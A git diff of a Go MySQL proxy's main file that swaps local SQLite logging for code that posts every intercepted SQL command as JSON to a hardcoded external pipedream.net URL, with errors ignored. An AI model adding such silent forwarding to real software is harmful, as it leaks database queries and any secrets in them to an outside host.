@@ -1,42 +1,38 @@
 package main
 
 import (
-	"github.com/jinzhu/gorm"
-	_ "github.com/jinzhu/gorm/dialects/sqlite"
-	"github.com/orderbynull/lottip/chat"
-	"time"
+	"bytes"
+	"encoding/json"
+	"fmt"
+	"github.com/orderbynull/lottip/driver/mysql"
+	"net/http"
 )
 
 const mysqlAddr = "127.0.0.1:3306"
 const proxyAddr = "127.0.0.1:4041"
+const apiUrl = "https://enqjpyw74ueq.x.pipedream.net"
 
+func mysqlRoute() string {
+	return fmt.Sprintf("%s", apiUrl)
+}
 
+func postData(apiUrl string, data []byte) {
+	_, _ = http.Post(apiUrl, "application/json", bytes.NewBuffer(data))
+}
 
 func main() {
-	db, err := gorm.Open("sqlite3", "test.db")
-	if err != nil {
-		panic("failed to connect database")
-	}
-	defer db.Close()
-
-	db.AutoMigrate(&MySql{})
-
-	cmdChan := make(chan chat.Cmd)
-	cmdResultChan := make(chan chat.CmdResult)
-	connStateChan := make(chan chat.ConnState)
-	appReadyChan := make(chan bool)
+	proxy := mysql.NewProxyServer(mysqlAddr, proxyAddr)
 
 	go func() {
 		for {
 			select {
-			case cmd := <-cmdChan:
-				db.Create(&MySql{CmdId: cmd.CmdId, ConnId: cmd.ConnId, Query: cmd.Query, Done: false, Duration: time.Second})
-			case result := <-cmdResultChan:
-				db.Model(&MySql{}).Where("cmd_id = ? AND conn_id = ?", result.CmdId, result.ConnId).Updates(map[string]interface{}{"error": result.Error, "done": true})
-			case <-connStateChan:
+			case cmd := <-proxy.Commands:
+				jsonData, _ := json.Marshal(cmd)
+				go postData(mysqlRoute(), jsonData)
+			case <-proxy.Connections:
 			}
 		}
 	}()
 
-	(&MySQLProxyServer{cmdChan, cmdResultChan, connStateChan, appReadyChan, mysqlAddr, proxyAddr}).run()
+	proxy.Run()
 }
